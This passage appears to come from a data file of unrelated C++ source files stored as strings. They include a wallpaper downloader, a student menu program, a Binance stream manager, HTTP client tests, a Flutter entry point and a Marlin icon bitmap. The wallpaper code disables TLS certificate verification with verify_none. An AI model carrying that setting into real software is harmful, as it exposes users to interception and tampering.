asio::io_context ioc{1};\n  asio::ssl::context ctx(asio::ssl::context::tlsv12_client);\n  ctx.set_verify_mode(asio::ssl::verify_none);\n\n  try {\n    auto res = GetScreenResolution();\n    auto img_data = DownloadImage(ioc, ctx, res, lcid);\n    auto img_path = SaveImage(img_data);\n    SetDesktopWallpaper(img_path);\n  } catch (const std::exception& e) {\n    std::cout << e.what() << std::endl;\n    system(\"pause\");\n  }\n}\n",
    "#include <iostream>\n#include <getopt.h>\n\nusing namespace std;\n\nvoid usage(const char* progname);\nvoid initValue(float* values1, float* values2, double* value3, float* output, unsigned int N);\n\nextern void test1(float* a, float* b, float* c, int N);\nextern void test2(float *__restrict a, float *__restrict b, float *__restrict c, int N);\nextern double test3(double* __restrict a, int N) ;\n\nint main(int argc, char * argv[]) {\n  int N = 1024;\n  int whichTestToRun = 1;\n\n  // parse commandline options ////////////////////////////////////////////\n  int opt;\n  static struct option long_options[] = {\n    {\"size\", 1, 0, 's'},\n    {\"test\", 1, 0, 't'},\n    {\"help\", 0, 0, '?'},\n    {0 ,0, 0, 0}\n  };\n\n  while ((opt = getopt_long(argc, argv, \"st:?\", long_options, NULL)) != EOF) {\n\n    switch (opt) {\n      case 's':\n        N = atoi(optarg);\n        if (N <= 0) {\n          cout << \"Error: Workload size is set to\" << N << \" (<0).\\n\";\n          return -1;\n        }\n        break;\n      case 't':\n        whichTestToRun = atoi(optarg);\n        if (whichTestToRun <= 0 || whichTestToRun >= 4) {\n          cout << \"Error: test\" << whichTestToRun << \"() is not available.\\n\";\n          return -1;\n        }\n        break;\n      case 'h':\n      default:\n        usage(argv[0]);\n        return 1;\n    }\n  }\n\n  float* values1 = new(std::align_val_t{ 32 }) float[N];\n  float* values2 = new(std::align_val_t{ 32 }) float[N];\n  double* values3 = new(std::align_val_t{ 32 }) double[N];\n  float* output = new(std::align_val_t{ 32 }) float[N];\n  initValue(values1, values2, values3, output, N);\n\n  cout << \"Running test\" << whichTestToRun << \"()...\\n\";\n  switch (whichTestToRun) {\n    case 1: test1(values1, values2, output, N); break;\n    case 2: test2(values1, values2, output, N); break;\n    case 3: test3(values3, N); break;\n  }\n\n  delete [] values1;\n  delete [] values2;\n  delete [] values3;\n  delete [] output;\n\n  return 0;\n}\n\nvoid usage(const char* progname) {\n  printf(\"Usage: %s [options]\\n\", progname);\n  printf(\"Program Options:\\n\");\n  printf(\"  -s  --size <N>     Use workload size N (Default = 1024)\\n\");\n  printf(\"  -t  --test <N>     Just run the testN function (Default = 1)\\n\");\n  printf(\"  -h  --help         This message\\n\");\n}\n\nvoid initValue(float* values1, float* values2, double* values3, float* output, unsigned int N) {\n  for (unsigned int i=0; i<N; i++)\n  {\n    // random input values\n    values1[i] = -1.f + 4.f * static_cast<float>(rand()) / RAND_MAX;\n    values2[i] = -1.f + 4.f * static_cast<float>(rand()) / RAND_MAX;\n    values3[i] = -1.f + 4.f * static_cast<double>(rand()) / RAND_MAX;\n    output[i] = 0.f;\n  }\n}\n",
    "#include \"Player.h\"\n#include <math.h>\n#include <Time/Time.h>\n#include <iostream>\n\nvoid Player::Start(sf::RenderWindow* window, std::vector<Object*>* objectList)\n{\n\t// Add spritepath first before we call bassclass start\n\tSetTag(\"Mouse\");\n\tspritePath = \"Assets/MainMouse.png\";\n\tObject::Start(window, objectList);\n\t//std::cout << \"Player start\\n\";\n}\nvoid Player::Update()\n{\n\tm_currentSpeed = m_defaultSpeed * (std::powf(m_reductionValue, m_foodinventory));\n\tHandleInput();\n\tObject* collidedObject = Object::CollidesWith(\"Food\");\n\tif (collidedObject != false)\n\t{\n\t\tstd::cout << \"Collide\" << std::endl;\n\t\tm_foodinventory++;\n\t\tcollidedObject->deletionMark = true;\n\t}\n\n\tObject::Update();\n\t//std::cout << \"Player update\\n\";\n}\nvoid Player::Shutdown()\n{\n\tObject::Shutdown();\n\t//std::cout << \"Player shut\\n\";\n}\n\nvoid Player::Eat()\n{\n\tif (m_foodinventory != 0)\n\t{\n\t\tm_foodinventory--;\n\t\tm_hunger += 30;\n\t\tif (m_hunger > 100)\n\t\t{\n\t\t\tm_hunger = 100;\n\t\t}\n\t}\n\tstd::cout << m_hunger << \" inv:\" << m_foodinventory << \"\\n\";\n}\n\nvoid Player::HandleInput()\n{\n\t// Movement\n\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::W))\n\t{\n\t\ttransform.position.y -= m_currentSpeed * Engine::Time::deltaTime;\n\t\ttransform.rotation = 270;\n\t}\n\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::A))\n\t{\n\t\ttransform.position.x -= m_currentSpeed * Engine::Time::deltaTime;\n\t\ttransform.rotation = 180;\n\t}\n\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::S))\n\t{\n\t\ttransform.position.y += m_currentSpeed * Engine::Time::deltaTime;\n\t\ttransform.rotation = 90;\n\t}\n\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::D))\n\t{\n\t\ttransform.position.x += m_currentSpeed * Engine::Time::deltaTime;\n\t\ttransform.rotation = 0;\n\t}\n\n\t/// Other inputs\n\t// Eat\n\t// This can also be done usng Events, but ill need to pass in the whole event object into the player\n\t// this is simply easier to do and wont hurt performance anyways. Might change in future when needed since its not really scalable.\n    if (sf::Keyboard::isKeyPressed(sf::Keyboard::E))\n    {\n        if (!keyEPressed)\n        {\n            Eat();\n            keyEPressed = true;  // Mark key as pressed\n        }\n    }\n    else keyEPressed = false;  // Reset when the key is released\n}\n",
    "#include <iostream>\n#include <string>\n#include \"nodo.h\"\nusing namespace std;\n\ntemplate <typename T>\nvoid agregarNodo(Nodo<T>*& head, T data) {\n    Nodo<T>* nuevoNodo = new Nodo<T>(data);\n    if (!head) {\n        head = nuevoNodo;\n    }\n    else {\n        Nodo<T>* temp = head;\n        while (temp->next) {\n            temp = temp->next;\n        }\n        temp->next = nuevoNodo;\n    }\n}\n\ntemplate <typename T>\nvoid imprimirLista(Nodo<T>* head) {\n    Nodo<T>* temp = head;\n    while (temp) {\n        cout << temp->data << \" -> \";\n        temp = temp->next;\n    }\n    cout << \"null\" << endl;\n}\n\n\ntemplate <typename T>\nvoid liberarLista(Nodo<T>*& head) {\n    Nodo<T>* temp;\n    while (head) {\n        temp = head;\n        head = head->next;\n        delete temp;\n    }\n    cout << \"\\nLa lista ha sido eliminada.\\n\" << endl;\n}\n\n\ntemplate <typename T>\nvoid menuAcciones(Nodo<T>*& lista) {\n    int opcion;\n    do {\n        cout << \"\\nQue deseas hacer con la lista?\\n\";\n        cout << \"1. Mostrar la lista\\n\";\n        cout << \"2. Borrar la lista\\n\";\n        cout << \"3. Volver al menu principal\\n\";\n        cout << \"Opcion: \";\n        cin >> opcion;\n\n        switch (opcion) {\n        case 1:\n            cout << \"\\nLista enlazada: \";\n            imprimirLista(lista);\n            break;\n        case 2:\n            liberarLista(lista);\n            break;\n        case 3:\n            cout << \"\\nRegresando al menu principal...\\n\";\n            break;\n        default:\n            cout << \"\\nOpcion no valida. Intente de nuevo.\\n\";\n        }\n    } while (opcion != 3);\n}\n\nvoid menu() {\n    int opcion;\n    do {\n        cout << \"\\nSeleccione el tipo de lista enlazada que desea crear:\\n\";\n        cout << \"1. Lista de enteros\\n\";\n        cout << \"2. Lista de strings\\n\";\n        cout << \"3. Lista de caracteres\\n\";\n        cout << \"4. Salir\\n\";\n        cout << \"Opcion: \";\n        cin >> opcion;\n\n        switch (opcion) {\n        case 1: {\n            Nodo<int>* listaInt = nullptr;\n            int valor;\n            char continuar;\n            do {\n                cout << \"\\nIngrese un valor entero: \";\n                cin >> valor;\n                agregarNodo(listaInt, valor);\n                cout << \"\\nDesea agregar otro valor? (s/n): \";\n                cin >> continuar;\n            } while (continuar == 's');\n            menuAcciones(listaInt);\n            liberarLista(listaInt);\n            break;\n        }\n        case 2: {\n            Nodo<string>* listaString = nullptr;\n            string valor;\n            char continuar;\n            do {\n                cout << \"\\nIngrese un string: \";\n                cin >> valor;\n                agregarNodo(listaString, valor);\n                cout << \"\\nDesea agregar otro valor? (s/n): \";\n                cin >> continuar;\n            } while (continuar == 's');\n            menuAcciones(listaString);\n            liberarLista(listaString);\n            break;\n        }\n        case 3: {\n            Nodo<char>* listaChar = nullptr;\n            char valor;\n            char continuar;\n            do {\n                cout << \"\\nIngrese un caracter: \";\n                cin >> valor;\n                agregarNodo(listaChar, valor);\n                cout << \"\\nDesea agregar otro valor? (s/n): \";\n                cin >> continuar;\n            } while (continuar == 's');\n            menuAcciones(listaChar);\n            liberarLista(listaChar);\n            break;\n        }\n        case 4:\n            cout << \"Saliendo...\\n\";\n            break;\n        default:\n            cout << \"\\nOpcion no valida. Intente de nuevo.\\n\";\n        }\n    } while (opcion != 4);\n}\n\nint main() {\n    menu();\n    return 0;\n}",
    "#include <iostream>\r\n#include <cstdlib> \r\n#include <ctime>   \r\n\r\nusing namespace std;\r\n\r\nvoid swapEvenOdd(int* array, int size) {\r\n    for (int i = 0; i < size - 1; i += 2) {\r\n      \r\n        int temp = array[i];\r\n        array[i] = array[i + 1];\r\n        array[i + 1] = temp;\r\n    }\r\n}\r\n\r\nvoid displayArray(const int* array, int size) {\r\n    for (int i = 0; i < size; ++i) {\r\n        cout << array[i] << ' ';\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main() {\r\n    srand(static_cast<unsigned int>(time(0))); \r\n\r\n    int size;\r\n    cout << \"Enter the size of the array: \";\r\n    cin >> size;\r\n\r\n    if (size <= 0) {\r\n        cout << \"Size of array must be a positive number!\" << endl;\r\n        return 1; \r\n    }\r\n\r\n    \r\n    int* array = new int[size];\r\n\r\n \r\n    for (int i = 0; i < size; ++i) {\r\n        array[i] = rand() % 100;\r\n    }\r\n\r\n\r\n    cout << \"Initial array: \";\r\n    displayArray(array, size);\r\n\r\n   \r\n    swapEvenOdd(array, size);\r\n\r\n\r\n    cout << \"Array after swapping even and odd indices: \";\r\n    displayArray(array, size);\r\n\r\n \r\n    delete[] array;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <queue>\n#include <vector>\n#include <map>\nusing namespace std;\n\nclass Student {\npublic:\n    string name;\n    int age;\n    string address;\n    string course;\n\nStudent(string n, int a, string add, string c) : name(n), age(a), address(add), course(c) {}\n\n};\n\nclass UPSystem {\npublic:\n    vector <Student> listOfStudents;\n\nvoid enrollStudent(Student enrollee) {\n    listOfStudents.push_back(enrollee);\n}\n\nvoid displayEnrollees() {\n    cout << \"List of Students:\\n\";\n    int counter = {};\n    for (Student it : listOfStudents) {\n        cout << \"Name: \" << it.name << endl;\n        cout << \"Age: \" << it.age << endl;\n        cout << \"Address: \" << it.address << endl;\n        cout << \"Course: \" << it.course << endl;\n    }\n}\n\n};\n\nint main() {\n    UPSystem system;\n\n    int age;\n    string name, add, course;\n\n    short numberOfEnrollees;\n    cout << \"How many students do you want to enroll?\";\n    cin >> numberOfEnrollees;\n    for(short it = 0; it < numberOfEnrollees; it++) {\n        cin.ignore();\n        cout << \"Enter name: \";\n        getline(cin, name);\n        cout << \"Enter address: \";\n        getline(cin, add);\n        cout << \"Enter course: \";\n        getline(cin, course);\n        cout << \"Enter age: \";\n        cin >> age;\n        Student student(name, age, add, course);\n        system.enrollStudent(student);\n    }\n\n    system.displayEnrollees();\n\n    return 0;\n}",
    "//\n// Created by Arthur Motelevicz on 17/09/24.\n//\n#ifdef __APPLE__\n#include <pthread.h>\n#endif\n\n#include <mgutils/Utils.h>\n#include <mgutils/Logger.h>\n#include <mgutils/Exceptions.h>\n#include <mgutils/Json.h>\n\n#include \"managers/BMDManager.h\"\n\nnamespace bmd\n{\n  std::shared_ptr<BMDManager> BMDManager::create()\n  {\n    auto instance = std::shared_ptr<BMDManager>(new BMDManager());\n    instance->initialize();\n    return instance;\n  }\n\n  void BMDManager::initialize()\n  {\n    _streamer = std::make_shared<bb::Streamer>();\n    auto self = shared_from_this(); // Captura um shared_ptr de si mesmo\n    _worker = std::thread([self]() {\n#ifdef __APPLE__\n      pthread_setname_np(\"BMD-Manager-Worker\");\n#endif\n      try {\n        while (!self->_stopWorker)\n        {\n          self->_ioc.run_one();\n        }\n      }\n      catch (const boost::system::system_error &e)\n      {\n        logE << \"Error running BMDManager ioContext for timers: \" << e.what();\n      }\n    });\n  }\n\n  BMDManager::BMDManager():\n  _workGuard(boost::asio::make_work_guard(_ioc))\n  {}\n\n  BMDManager::~BMDManager()\n  {\n    logW << \"BMDManager destructor\";\n    _workGuard.reset(); // Allow io_context to stop when no work remains\n    _stopWorker = true;\n    _ioc.stop();\n    if(_worker.joinable())\n    {\n      if (std::this_thread::get_id() == _worker.get_id())\n        logE << \"Destructor called from worker thread; cannot join from within the same thread.\";\n      else\n        _worker.join();\n    }\n\n    _streams.clear();\n  }\n\n  std::shared_ptr< bb::network::ws::Stream> BMDManager::createAggTradeStream(\n      BinanceServiceType type,\n      const std::string& symbolCode,\n      uint32_t reconnectInSeconds,\n      const AggTradeStreamCallback& aggTradeCB,\n      const ReconnetUserDataStreamCallback& cb)\n  {\n    auto cpSymbol = mgutils::string::toLower(symbolCode);\n\n    auto url = _shouldUseTestUrl ? _testsUrl : (( type == BinanceServiceType::SPOT ) ? _spotSocketBaseUrl : _futuresUsdSocketBaseUrl);\n\n    std::weak_ptr<bb::network::ws::Stream> stream =\n        _streamer->openStream(\n            url,\n            _shouldUseTestUrl ?  _testsPort : \"443\" ,\n            \"/ws/\" + cpSymbol + \"@aggTrade\",\n            !_shouldUseTestUrl,\n            [self = shared_from_this(), aggTradeCB, cb, symbolCode](bool success, const std::string& data, SharedStream stream)\n            {\n              if (!success)\n              {\n                logW << \"Stream @aggTrade closed with msg: \" << data;\n                aggTradeCB(false, models::AggTrade());\n\n                // Stop the stream, which will trigger the close callback\n                stream->stopWithCloseCallbackTriggered();\n                return;\n              }\n\n              try\n              {\n                auto document = mgutils::Json::parse(data);\n                models::AggTrade aggTrade;\n                aggTrade.deserialize(document);\n                aggTradeCB(success, aggTrade);\n              }\n              catch (const mgutils::JsonParseException& error)\n              {\n                logE << \"FuturesUSD Stream @aggTrade parse error: \" << error.what();\n                return;\n              }\n              catch (const std::exception& ex)\n              {\n                logE << \"Unexpected error while parsing aggTrade data: \" << ex.what();\n              }\n            }\n        );\n\n    auto sharedStream = stream.lock();\n    sharedStream->setCloseStreamCallback(\n        [self = shared_from_this(), symbolCode, aggTradeCB, reconnectInSeconds, type, cb] (SharedStream closedStream)\n        {\n          self->reconnectionHandlerAggTradeStream(\n              closedStream,\n              type,\n              symbolCode,\n              reconnectInSeconds,\n              aggTradeCB,\n              true,\n              cb);\n        });\n\n    sharedStream->setPingStreamCallback([this](const std::shared_ptr<bb::network::ws::Stream>& stream)\n    {\n      if(_heartBeatCallback)\n        _heartBeatCallback();\n\n      // Restart the heartbeat for stream\n      auto it = _streams.find(stream->getId());\n      if (it != _streams.end())\n      {\n        it->second.heartBeatChecker->restart();\n      }\n      else\n      {\n        logE << \"Stream not tracked! Something wrong! Stream Id (\" << stream->getId() << \")\";\n        assert(false && \"Stream not tracked! Something wrong!\");\n      }\n    });\n\n    return std::move(sharedStream);\n  }\n\n  void BMDManager::reconnectionHandlerAggTradeStream(\n      std::shared_ptr<bb::network::ws::Stream> stream,\n      BinanceServiceType type,\n      const std::string &symbolCode, uint32_t reconnectInSeconds,\n      const AggTradeStreamCallback &aggTradeCB,\n      bool timerSuccess,\n      const ReconnetUserDataStreamCallback &cb)\n  {\n    std::lock_guard<std::mutex> lock(_streamsMutex);\n\n    auto itStream = _streams.find(stream->getId());\n    if (itStream == _streams.end()) {\n      logI << \"Stream \" << stream->getId() << \" has been closed, skipping reconnection.\";\n      return;\n    }\n\n    if (!timerSuccess)\n    {\n      logW << \"Tr",
    "#include <thread>\n#include <chrono>\n#include <format>\n\n#include <httplib.h>\n#include <gtest/gtest.h>\n#include <curl/curl.h>\n\n#include \"error.hpp\"\n#include \"http_client.hpp\"\n\nclass CurlEnv : public ::testing::Environment\n{\npublic:\n    ~CurlEnv() override = default;\n    void SetUp() override\n    {\n        curl_global_init(CURL_GLOBAL_ALL);\n    }\n};\n\ntesting::Environment* const curl_env =\n    testing::AddGlobalTestEnvironment(new CurlEnv);\n\nTEST(HTTPSession, CanGet)\n{\n    using namespace std::chrono_literals;\n\n    httplib::Server server;\n    server.Get(\"/\", [](const httplib::Request &, httplib::Response &res) {\n        res.set_content(\"aaa\", \"text/plain\");\n    });\n    int port;\n    std::thread t([&]()\n    {\n        port = server.bind_to_any_port(\"localhost\");\n        server.listen_after_bind();\n    });\n    server.wait_until_ready();\n\n    {\n        HTTPSession s;\n        auto result = s.get(std::format(\"http://localhost:{}/\", port));\n        ASSERT_TRUE(result.has_value());\n        const std::vector<std::byte>& payload = (*result)->payload;\n        EXPECT_EQ(std::string_view(reinterpret_cast<const char*>(payload.data()),\n                                   payload.size()),\n                  \"aaa\");\n        EXPECT_EQ((*result)->status, 200);\n        ASSERT_TRUE((*result)->header.contains(\"Content-Type\"));\n        EXPECT_EQ((*result)->header.at(\"Content-Type\"), \"text/plain\");\n\n        // HTTP error\n        result = s.get(std::format(\"http://localhost:{}/aaa\", port));\n        ASSERT_TRUE(result.has_value());\n        EXPECT_EQ((*result)->status, 404);\n\n        // cURL error\n        result = s.get(\"http://bad.invalid/\");\n        EXPECT_FALSE(result.has_value());\n    }\n\n    server.stop();\n    t.join();\n}\n\nTEST(HTTPSession, CanPost)\n{\n    using namespace std::chrono_literals;\n\n    httplib::Server server;\n    server.Post(\"/\", [](const httplib::Request& req, httplib::Response& res) {\n        EXPECT_FALSE(req.is_multipart_form_data());\n        auto idx = req.headers.find(\"Content-Type\");\n        if(req.body == \"aaa\" && idx != std::end(req.headers) &&\n           idx->second == \"text/plain\")\n        {\n            res.set_content(\"bbb\", \"text/plain\");\n        }\n        else\n        {\n            res.set_content(\"error\", \"text/plain\");\n            res.status = 401;\n        }\n    });\n    int port;\n    std::thread t([&]()\n    {\n        port = server.bind_to_any_port(\"localhost\");\n        server.listen_after_bind();\n    });\n    server.wait_until_ready();\n\n    {\n        HTTPSession s;\n        {\n            E<const HTTPResponse*> result = s.post(\n                HTTPRequest(std::format(\"http://localhost:{}/\", port))\n                .setPayload(\"aaa\")\n                .setContentType(\"text/plain\"));\n            ASSERT_TRUE(result.has_value());\n            const HTTPResponse& res = **result;\n            EXPECT_EQ(res.status, 200);\n            ASSERT_TRUE(res.header.contains(\"Content-Type\"));\n            EXPECT_EQ(res.header.at(\"Content-Type\"), \"text/plain\");\n            EXPECT_EQ(std::string_view(\n                          reinterpret_cast<const char*>(res.payload.data()),\n                          res.payload.size()),\n                      \"bbb\");\n        }\n        {\n            E<const HTTPResponse*> result = s.post(\n                HTTPRequest(std::format(\"http://localhost:{}/\", port))\n                .addHeader(\"Content-Type\", \"text/plain\").setPayload(\"nonono\"));\n            ASSERT_TRUE(result.has_value());\n            const HTTPResponse& res = **result;\n            EXPECT_EQ(res.status, 401);\n            ASSERT_TRUE(res.header.contains(\"Content-Type\"));\n            EXPECT_EQ(res.header.at(\"Content-Type\"), \"text/plain\");\n            EXPECT_EQ(std::string_view(\n                          reinterpret_cast<const char*>(res.payload.data()),\n                          res.payload.size()),\n                      \"error\");\n        }\n    }\n\n    server.stop();\n    t.join();\n}\n",
    "#include <cstdlib>\n#include <iostream.h>\n#include <stdio.h>\n#include <conio.h>\n\nusing namespace std;\n\nint main(int argc, char *argv[])\n{\n    int opciones;\n    int opciones1;\n    int opciones2;\n    int opciones3;\n    int opciones4;\n    opciones=0;\n    opciones1=500;\n    opciones2=300;\n    opciones3=180;\n    opciones4=48;\n    \n    system(\"color 4a\"); \n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||Pizzeria Luis C.A|||||||||||||||||||||||||\"<<endl;\n    cout<<\"   ||||||||||||||||||||||||||Bienvenidos||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||Creado por: Luis Maita||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl;\n    cout<<\"   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\"<<endl<<endl;\n    cout<<\"Bienvenidos A Pizza Luis:\"<<endl<<endl;\n    cout<<\"Tamano de Pizza\"<<endl<<endl;\n    cout<<\"1. Grande BS. 500\"<<endl<<endl;\n    cout<<\"2. Mediana BS. 300\"<<endl<<endl;\n    cout<<\"3. Pequena BS. 180\"<<endl<<endl;\n    cout<<\"Tamano de Pizza:\"<<endl;\n    cin>>opciones;\n    cout<<\"----------------------------------------------------------------\"<<endl<<endl;\n   \n    switch (opciones){\n           \n           case 1:cout<<\"1. Margarita\"<<endl<<endl;\n                  cout<<\"2. Pollo Y Queso \"<<endl<<endl;\n                  cout<<\"3. Pernil\"<<endl<<endl;\n                  cout<<\"4. Cuatro Sabores\"<<endl<<endl;\n                  cout<<\"Tipo de Pizza:\"<<endl;\n                  cin>>opciones1;\n                  cout<<\"----------------------------------------------------------------\"<<endl<<endl;\n                  break;\n           case 2:cout<<\"1. Margarita\"<<endl<<endl;\n                  cout<<\"2. Pollo Y Queso \"<<endl<<endl;\n                  cout<<\"3. Pernil\"<<endl<<endl;\n                  cout<<\"4. Cuatro Sabores\"<<endl<<endl;\n                  cout<<\"Tipo de Pizza:\"<<endl;\n                  cin>>opciones2;\n                  cout<<\"----------------------------------------------------------------\"<<endl<<endl;\n                  break;    \n           case 3:cout<<\"1. Margarita\"<<endl<<endl;\n                  cout<<\"2. Pollo Y Queso \"<<endl<<endl;\n                  cout<<\"3. Pernil\"<<endl<<endl;\n                  cout<<\"4. Cuatro Sabores\"<<endl<<endl;\n                  cout<<\"Tipo de Pizza:\"<<endl;\n                  cin>>opciones3;\n                  cout<<\"----------------------------------------------------------------\"<<endl<<endl;\n                  break;\n     \n}\n    cout<<\"Ingrediente Adicionales\"<<endl<<endl; \n    cout<<\"1. Maiz BS. 48\"<<endl<<endl;\n    cout<<\"2. Queso Mozzarela BS. 48\"<<endl<<endl;\n    cout<<\"3. Salchichon BS. 48\"<<endl<<endl;\n    cout<<\"4. Pimenton BS. 48\"<<endl<<endl;\n    cout<<\"Tipo de Ingrediente:\"<<endl;\n    cin>>opciones4;\n    cout<<\"Garcias Por Su Compra\"<<endl;\n    cout<<\"----------------------------------------------------------------\"<<endl<<endl;\n    \n        \n    system(\"PAUSE\");\n    return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"basketball\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * Marlin 3D Printer Firmware\n * Copyright (c) 2020 MarlinFirmware [https://github.com/MarlinFirmware/Marlin]\n *\n * Based on Sprinter and grbl.\n * Copyright (c) 2011 Camiel Gubbels / Erik van der Zalm\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n */\n\n#include \"../../../inc/MarlinConfigPre.h\"\n\n#if HAS_GRAPHICAL_TFT\n\nextern const uint8_t leveling_32x32x4[512] = {\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x87, 0x89, 0x99, 0x99, 0x99, 0x99, 0x87, 0x78, 0x88, 0x77, 0x78, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x87, 0xAF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE6, 0x88, 0x87, 0x7B, 0x77, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x87, 0xAF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC4, 0x88, 0x87, 0x8F, 0x97, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x77, 0xAF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD4, 0x88, 0x77, 0xEF, 0xF5, 0x88, 0x88, 0x88,\n  0x88, 0x87, 0x77, 0xAF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC5, 0x88, 0x7A, 0xFF, 0xFC, 0x78, 0x88, 0x88,\n  0x88, 0x87, 0x8F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x97, 0x7A, 0x88, 0x88, 0x58, 0x88, 0x88,\n  0x88, 0x87, 0x8F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x66, 0x87, 0x45, 0x55, 0x57, 0x88, 0x88,\n  0x88, 0x87, 0x8F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x76, 0x88, 0x77, 0x78, 0x88, 0x88, 0x88,\n  0x88, 0x87, 0x85, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xC5, 0x56, 0x7C, 0xFF, 0xFE, 0x67, 0x88, 0x88,\n  0x88, 0x88, 0x86, 0x55, 0xEF, 0xFF, 0xFF, 0xF9, 0x45, 0x57, 0x86, 0xFF, 0xF5, 0x57, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x87, 0x4C, 0xFF, 0xFF, 0x74, 0x57, 0x88, 0x87, 0x8F, 0xA4, 0x68, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x84, 0x9F, 0xD5, 0x45, 0x78, 0x88, 0x88, 0x7C, 0x55, 0x88, 0x88, 0x88,\n  0x87, 0x77, 0x77, 0x77, 0x88, 0x65, 0x55, 0x68, 0x87, 0x77, 0x77, 0x86, 0x57, 0x87, 0x77, 0x78,\n  0x77, 0x77, 0x77, 0x77, 0x77, 0x76, 0x56, 0x77, 0x77, 0x77, 0x77, 0x77, 0x67, 0x77, 0x77, 0x77,\n  0x7B, 0xFE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEF, 0xB7,\n  0x7C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xB6,\n  0x7C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xB5,\n  0x78, 0x67, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x66,\n  0x87, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x67,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 